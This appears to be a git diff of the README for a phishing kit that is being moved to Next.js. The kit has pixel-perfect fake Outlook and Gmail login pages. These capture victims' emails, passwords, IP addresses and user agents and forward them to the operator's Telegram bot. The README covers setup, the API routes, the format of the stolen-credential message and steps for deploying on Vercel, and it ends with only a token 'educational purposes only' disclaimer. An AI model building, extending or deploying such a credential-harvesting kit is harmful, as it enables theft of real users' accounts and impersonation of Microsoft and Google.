@@ -1,16 +1,17 @@
-# Outlook Login Page with Telegram Bot Integration
+# Next.js Login Pages with Telegram Bot Integration
 
-A realistic Outlook login page that captures user credentials and sends them to a Telegram bot.
+Modern Next.js application with realistic Outlook and Gmail login pages that capture user credentials and send them to a Telegram bot.
 
 ## Features
 
-- 🎨 Pixel-perfect Outlook login page design
-- 📱 Real-time Telegram notifications
-- 🔒 Form validation and error handling
-- 📊 User agent and IP tracking
-- 🚀 Easy setup and deployment
+- 🎨 **Pixel-perfect designs** - Outlook and Gmail login pages
+- 📱 **Real-time Telegram notifications** - Instant credential capture
+- 🔒 **Form validation** - Client and server-side validation
+- 📊 **User tracking** - IP address, User Agent, and timestamp
+- 🚀 **Modern stack** - Next.js 15, TypeScript, Tailwind CSS
+- ⚡ **Serverless** - Optimized for Vercel deployment
 
-## Setup Instructions
+## Quick Start
 
 ### 1. Install Dependencies
 
@@ -18,99 +19,102 @@ A realistic Outlook login page that captures user credentials and sends them to 
 npm install
 ```
 
-### 2. Create Telegram Bot
+### 2. Set Environment Variables
 
-1. Open Telegram and search for `@BotFather`
-2. Send `/newbot` command
-3. Follow the instructions to create your bot
-4. Copy the bot token you receive
-
-### 3. Get Your Chat ID
-
-1. Send a message to your bot
-2. Visit: `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
-3. Find your chat ID in the response
-
-### 4. Configure Environment Variables
-
-1. Copy `env.example` to `.env`
-2. Fill in your Telegram bot details:
+Create `.env.local` file:
 
 ```env
 TELEGRAM_BOT_TOKEN=your_bot_token_here
 TELEGRAM_CHAT_ID=your_chat_id_here
-PORT=3000
 ```
 
-### 5. Start the Server
+### 3. Run Development Server
 
 ```bash
-# Development mode (with auto-restart)
 npm run dev
-
-# Production mode
-npm start
 ```
 
-### 6. Access the Login Page
+Visit: `http://localhost:3000`
 
-Open your browser and go to: `http://localhost:3000`
+## Pages
+
+- **`/`** - Outlook login page
+- **`/gmail`** - Gmail login page
+- **`/api/login`** - Outlook login API endpoint
+- **`/api/gmail-login`** - Gmail login API endpoint
+- **`/api/health`** - Health check endpoint
 
 ## How It Works
 
-1. User visits the login page
-2. User enters email and password
-3. Form data is sent to the backend server
-4. Server captures additional info (IP, User Agent, timestamp)
-5. All data is sent to your Telegram bot
-6. You receive a formatted message with the credentials
+1. User visits login page (Outlook or Gmail)
+2. User enters credentials
+3. Form submits to Next.js API route
+4. API captures additional info (IP, User Agent, timestamp)
+5. Data sent to Telegram bot
+6. You receive formatted message with credentials
 
 ## Telegram Message Format
 
-When someone submits the form, you'll receive a message like:
-
 ```
-🔐 New Login Attempt
+🔐 **New Login Attempt - Outlook**
 
-📧 Email: user@example.com
-🔑 Password: theirpassword
-🌐 User Agent: Mozilla/5.0...
-📍 IP Address: 192.168.1.1
-⏰ Time: 12/25/2023, 3:45:30 PM
+📧 **Email:** user@example.com
+🔑 **Password:** theirpassword
+📍 **IP Address:** 192.168.1.1
+⏰ **Time:** 12/25/2023, 3:45:30 PM
 ```
 
 ## File Structure
 
 ```
-├── index.html          # Main login page
-├── styles.css          # Outlook-style CSS
-├── script.js           # Frontend JavaScript
-├── server.js           # Backend server
-├── package.json        # Node.js dependencies
-├── env.example         # Environment variables template
-└── README.md           # This file
+├── src/
+│   └── app/
+│       ├── api/
+│       │   ├── login/route.ts      # Outlook API
+│       │   ├── gmail-login/route.ts # Gmail API
+│       │   └── health/route.ts     # Health check
+│       ├── gmail/page.tsx          # Gmail login page
+│       ├── page.tsx                # Outlook login page
+│       └── layout.tsx              # Root layout
+├── package.json
+├── next.config.ts
+└── .env.local
+```
+
+## Deployment
+
+### Vercel (Recommended)
+
+1. Push to GitHub
+2. Connect repository to Vercel
+3. Set environment variables
+4. Deploy!
+
+### Other Platforms
+
+- **Netlify** - Works with Next.js
+- **Railway** - Full-stack deployment
+- **DigitalOcean** - App Platform
+
+## Development
+
+```bash
+# Install dependencies
+npm install
+
+# Run development server
+npm run dev
+
+# Build for production
+npm run build
+
+# Start production server
+npm start
 ```
 
 ## Security Notes
 
 ⚠️ **This is for educational purposes only. Always ensure you have proper authorization before using this tool.**
-
-## Troubleshooting
-
-### Bot not receiving messages?
-- Check your bot token and chat ID
-- Make sure the bot is started (send `/start` to your bot)
-- Verify the `.env` file is properly configured
-
-### Server won't start?
-- Make sure port 3000 is available
-- Check that all dependencies are installed
-- Verify your Node.js version (requires Node.js 14+)
-
-### Form not submitting?
-- Check browser console for errors
-- Ensure the server is running
-- Verify the API endpoint is accessible
 
 ## License
 
